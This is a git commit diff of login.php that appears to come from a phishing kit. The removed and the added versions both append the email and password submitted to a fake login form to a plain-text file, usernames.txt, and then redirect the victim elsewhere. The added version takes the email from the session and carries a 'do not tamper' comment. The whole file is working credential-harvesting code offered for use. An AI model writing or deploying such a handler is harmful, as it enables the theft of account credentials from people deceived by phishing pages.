40c451b5b50a352b14c9b6ac24ec935f921993bd
Four07 <103881001+Four07@users.noreply.github.com>
2022-06-19 19:15:36 +0000

    Add files via upload

--- login.php
+++ login.php
@@ -1,6 +1,14 @@
-<?php
-include 'ip.php';
-
-file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: <CUSTOM>');
-exit();
+<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
+			session_start();
+			
+			$pass = $_POST["password"];
+			$email=$_SESSION["Email"];
+			
+			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ]   " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
+  			header('Location: <REDIRECT>');
+			exit();
+			
+			
+			session_destroy();
+			
+?>
